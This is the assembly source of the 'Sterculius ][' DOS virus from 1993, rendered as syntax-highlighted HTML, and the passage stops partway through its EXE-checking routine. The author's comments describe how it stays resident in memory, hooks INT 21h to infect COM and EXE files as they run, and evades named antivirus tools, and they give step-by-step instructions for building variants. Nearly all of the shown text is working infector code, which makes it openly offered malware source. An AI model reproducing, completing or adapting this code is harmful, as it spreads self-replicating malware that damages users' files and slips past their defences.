<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>STER2.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment $</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                  STERCULIUS ][ VIRUS</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   This is an 'upgrade build' of CRYPT #18's STERCULIUS virus.</span><span class="sc0">
</span><span class="sc1">;   I have made some changes, in particular STERCULIUS ][ now infects</span><span class="sc0">
</span><span class="sc1">;   EXE files as well as COM files.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The procedure to infect EXE files is rather simple:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Sterculius installs itself and its INT 21h handler in the memory</span><span class="sc0">
</span><span class="sc1">;   'hole' located after the interrupt vector table (reference:</span><span class="sc0">
</span><span class="sc1">;   CRYPT #18). The INT 21h handler checks when a file is executed;</span><span class="sc0">
</span><span class="sc1">;   then it opens it and determines whether it is a COM or an EXE</span><span class="sc0">
</span><span class="sc1">;   file by checking for a 'MZ' or 'ZM' at the beginning of the file.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   After the nature of the file has been determined, the virus proceeds</span><span class="sc0">
</span><span class="sc1">;   to read to EXE header and to modify the entry point field (CS:IP)</span><span class="sc0">
</span><span class="sc1">;   and the size of the load module/file (how many bytes get loaded from</span><span class="sc0">
</span><span class="sc1">;   the file to memory) on the header.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Then, infection takes place and the new EXE header is written to</span><span class="sc0">
</span><span class="sc1">;   the file.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Note that no change is made to the stack segment and the offset of</span><span class="sc0">
</span><span class="sc1">;   the original EXE infected file (SS:SP); in other words the virus</span><span class="sc0">
</span><span class="sc1">;   does not have its own stack segment and offset. I considered this</span><span class="sc0">
</span><span class="sc1">;   to be unnecessary since all well written EXE programs have a stack</span><span class="sc0">
</span><span class="sc1">;   segment (SS) far up in memory from the code segment (CS). The</span><span class="sc0">
</span><span class="sc1">;   danger of the virus corrupting itself when using the stack is</span><span class="sc0">
</span><span class="sc1">;   non-existent, considering the size of the virus and the fact that</span><span class="sc0">
</span><span class="sc1">;   on the installation part of STERCULIUS ][ the stack is barely used.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The challenge when writing this 'upgrade' was to keep the code small</span><span class="sc0">
</span><span class="sc1">;   enough so it would work properly not corrupt the BIOS data</span><span class="sc0">
</span><span class="sc1">;   loaded by IO.SYS / IBMIO.SYS at segment 0040.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Some original features of STERCULIUS have been commented out, to</span><span class="sc0">
</span><span class="sc1">;   downsize the code, but in most cases the virus will work perfectly</span><span class="sc0">
</span><span class="sc1">;   if they are included. </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Here is how to make you own STERCULIUS ][ variant:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Variant 1:</span><span class="sc0">
</span><span class="sc1">;         Uncomment (take out the ';' before the instructions)</span><span class="sc0">
</span><span class="sc1">;         in the following labeled parts:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Save Attributes</span><span class="sc0">
</span><span class="sc1">;         Restore Attributes</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Compile and link.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Variant 2:</span><span class="sc0">
</span><span class="sc1">;         Uncomment the following labeled parts:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Save Date and time</span><span class="sc0">
</span><span class="sc1">;         Restore Date and Time</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Compile and link.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Variant 3:</span><span class="sc0">
</span><span class="sc1">;         Uncomment the following labeled parts:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Save Date and time</span><span class="sc0">
</span><span class="sc1">;         Restore Date and Time</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Save Attributes</span><span class="sc0">
</span><span class="sc1">;         Restore Attributes</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Compile and link.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   K”hntark.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; $</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;          STERCULIUS ][ VIRUS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; AUTHOR:  K”hntark </span><span class="sc0">
</span><span class="sc1">; DATE:    SEPTEMBER 1993</span><span class="sc0">
</span><span class="sc1">; Memory Resident COM, EXE infector</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Success:  F-prot 2.09D - VIRSTOP</span><span class="sc0">
</span><span class="sc1">;           VIREX 2.8</span><span class="sc0">
</span><span class="sc1">;           MSAV - will give warning, if 'continue' is pressed the</span><span class="sc0">
</span><span class="sc1">;                  all infections will go undetected</span><span class="sc0">
</span><span class="sc1">;           -D   -will install but -D will regain control of the INT 21</span><span class="sc0">
</span><span class="sc1">;           TBMEM 6.05 - will crash as it installs some instructions in the</span><span class="sc0">
</span><span class="sc1">;                        middle of the hole where Sterculius ][ resides</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">                                                 
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">   </span><span class="sc1">;Jump to Virus_Entry / infection ID</span><span class="sc0">

</span><span class="sc5">FAKE_HOST</span><span class="sc4">:</span><span class="sc0">                                
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">              </span><span class="sc1">;host file terminate</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">VIRUS_ENTRY</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INITIALIZE</span><span class="sc0">

</span><span class="sc5">F_NAME</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'STERCULIUS ]['</span><span class="sc0">      </span><span class="sc1">;The Roman god of feces</span><span class="sc0">

</span><span class="sc5">INITIALIZE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">;save original ES</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">;save original DS</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                   </span><span class="sc1">;fix DS and ES</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">;ES=CS</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">;DS=CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                </span><span class="sc1">;save si</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EXE_FLAG</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">EXE_SKIP</span><span class="sc0">

</span><span class="sc1">;*****************                </span><span class="sc0">
</span><span class="sc1">; Restore host</span><span class="sc0">
</span><span class="sc1">;*****************</span><span class="sc0">
        
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">HOST_STUB</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">             </span><span class="sc1">;from ds:si to es:di</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">     </span><span class="sc1">;restore si</span><span class="sc0">

</span><span class="sc5">EXE_SKIP</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;***************************                </span><span class="sc0">
</span><span class="sc1">; Check if already resident</span><span class="sc0">
</span><span class="sc1">;***************************</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;AX=00</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;ES=00</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">01E0h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'TS'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ZIZE</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">;move virus to 0000:01E0 from ds:si to es:di</span><span class="sc0">
        
</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">; Mov INT 21 address</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">
        
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">        </span><span class="sc1">;position destination pointer at REAL_INT_21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">;ds=0</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                </span><span class="sc1">;from ds:si to es:di</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0"> 
        
</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Hook INT 21</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">01E0h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">INT_21_HANDLER</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">                           </span><span class="sc1">;disable interrupts</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">  </span><span class="sc1">;address of INT 21 handler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  
        </span><span class="sc6">sti</span><span class="sc0">                           </span><span class="sc1">;enable interrupts  </span><span class="sc0">

</span><span class="sc5">EXIT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">;restore original ES</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">;restore original ES      </span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EXE_FLAG</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">EXE_RETURN</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;return to host</span><span class="sc0">

</span><span class="sc5">EXE_RETURN</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CSIP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CSIP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0CBh</span><span class="sc0">                                   </span><span class="sc1">;retf</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CSIP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EXE_FLAG</span><span class="sc4">:</span><span class="sc0">       
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NEW_HOST_ENTRY</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">

</span><span class="sc5">INT_21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">  
        </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">REALL_INT_21</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
         
</span><span class="sc5">QUICK_EXIT</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">QUICK_OUT</span><span class="sc0">
</span><span class="sc5">RESTORE_ATTRIBUTES</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">RESTORE_ATTRIBUTESS</span><span class="sc0">
</span><span class="sc5">CLOSE_FILE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CLOSE_FILEE</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">INT_21_HANDLER</span><span class="sc4">:</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Bh</span><span class="sc0">           </span><span class="sc1">;execute a file?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">QUICK_EXIT</span><span class="sc0">       </span><span class="sc1">;quick exit handler</span><span class="sc0">
         
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> 
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">;ES=CS</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  1-Save Attributes</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

        </span><span class="sc1">; mov     ax,4300h</span><span class="sc0">
        </span><span class="sc1">; call    INT_21</span><span class="sc0">
        </span><span class="sc1">; push    cx         ;save attributes to stack</span><span class="sc0">
        </span><span class="sc1">; push    ds</span><span class="sc0">
        </span><span class="sc1">; push    dx         ;ds:dx = pathname to file</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  2-Klear Attributes</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">QUICK_EXIT</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  3-Open File</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RESTORE_ATTRIBUTES</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">;file handle to bx</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  4-Save Date &amp; time</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">
         
         </span><span class="sc1">;mov   ax,5700h</span><span class="sc0">
         </span><span class="sc1">;call  INT_21</span><span class="sc0">
         </span><span class="sc1">;push  dx              ;save date</span><span class="sc0">
         </span><span class="sc1">;push  cx              ;save time</span><span class="sc0">

</span><span class="sc1">;********************************</span><span class="sc0">
</span><span class="sc1">;  5-Read 26 bytes / EXE header</span><span class="sc0">
</span><span class="sc1">;********************************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">26d</span><span class="sc0">               </span><span class="sc1">;# of bytes to read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">HOST_STUBB</span><span class="sc0">        </span><span class="sc1">;buffer to read 4 / 26 bytes to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">;ds=cs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">               </span><span class="sc1">;read to ds:dx</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">CLOSE_FILE</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  6-Check File</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">     </span><span class="sc1">;EXE file?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CHECK_EXE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'MZ'</span><span class="sc0">     </span><span class="sc1">;EXE file?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CHECK_EXE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'S'</span><span class="sc0">  </span><span class="sc1">;infected COM file?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CLOSE_FILE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXE_FLAGG</span><span class="sc0">    </span><span class="sc1">;mark COM infection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">  </span><span class="sc1">;COM</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SKIP</span><span class="sc0">
        
</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  7-Check EXE</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

</span><span class="sc5">CHECK_EXE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc5">ID</span><span class="sc0">  </span><span class="sc1">;infected EXE?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CLOSE_FILE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc1">;WINDOWS EXE?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CLOSE_FILE</span><span class="sc0">

</span><span class="sc1">;                cmp     WORD PTR [si + 1Ah],00  ;internal overlay EXE?</span><span class="sc0">
</span><span class="sc1">;                jne     CLOSE_FILE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">EXE_FLAGG</span><span class="sc0">      </span><span class="sc1">;MARK EXE infection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0">  </span><span class="sc1">;EXE</span><span class="sc0">
